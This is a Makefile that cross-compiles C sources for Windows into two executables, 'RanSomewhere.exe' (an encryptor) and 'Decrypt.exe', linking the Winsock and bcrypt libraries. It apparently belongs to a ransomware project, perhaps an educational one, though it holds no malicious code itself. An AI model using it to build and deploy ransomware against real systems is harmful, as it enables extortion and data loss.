CC = x86_64-w64-mingw32-gcc
CFLAGS = -Wall -g
LDFLAGS = -lws2_32 -lbcrypt

COMMON_SRC = $(filter-out client/main_encrypt.c client/main_decrypt.c, $(wildcard client/*.c))
COMMON_OBJ = $(COMMON_SRC:client/%.c=%.o)

ENCRYPT_SRC = client/main_encrypt.c
ENCRYPT_OBJ = $(ENCRYPT_SRC:client/%.c=%.o)
ENCRYPT_EXEC = RanSomewhere.exe

DECRYPT_SRC = client/main_decrypt.c
DECRYPT_OBJ = $(DECRYPT_SRC:client/%.c=%.o)
DECRYPT_EXEC = Decrypt.exe

all: $(ENCRYPT_EXEC) $(DECRYPT_EXEC)
	rm -f $(COMMON_OBJ) $(ENCRYPT_OBJ) $(DECRYPT_OBJ)


$(ENCRYPT_EXEC): $(ENCRYPT_OBJ) $(COMMON_OBJ)
	$(CC) -o $@ $^ $(LDFLAGS)

$(DECRYPT_EXEC): $(DECRYPT_OBJ) $(COMMON_OBJ)
	$(CC) -o $@ $^ $(LDFLAGS)

%.o: client/%.c
	$(CC) -c $< $(CFLAGS)

clean:
	rm -f $(ENCRYPT_OBJ) $(DECRYPT_OBJ) $(COMMON_OBJ) $(ENCRYPT_EXEC) $(DECRYPT_EXEC)

.PHONY: clean
